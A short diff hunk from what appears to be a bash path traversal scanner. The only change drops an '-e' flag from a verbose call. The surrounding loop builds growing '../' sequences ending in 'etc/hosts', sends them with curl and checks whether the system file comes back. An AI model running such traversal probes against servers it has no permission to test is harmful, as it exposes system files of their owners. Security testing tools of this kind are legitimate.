@@ -121,7 +121,7 @@ echo
 for ((i=1; i<=depth; i++)); do
     query=$(printf '../%.0s' $(seq 1 $i))"etc/hosts" 
     url2="${url}${query}"
-    verbose -e "${YELLOW}Stade ${i} recursion${RESET}"
+    verbose "${YELLOW}Stade ${i} recursion${RESET}"
     verbose "$url2" 
     verbose "Searching for /etc/hosts file..."
     file=$(curl -s "$url2")
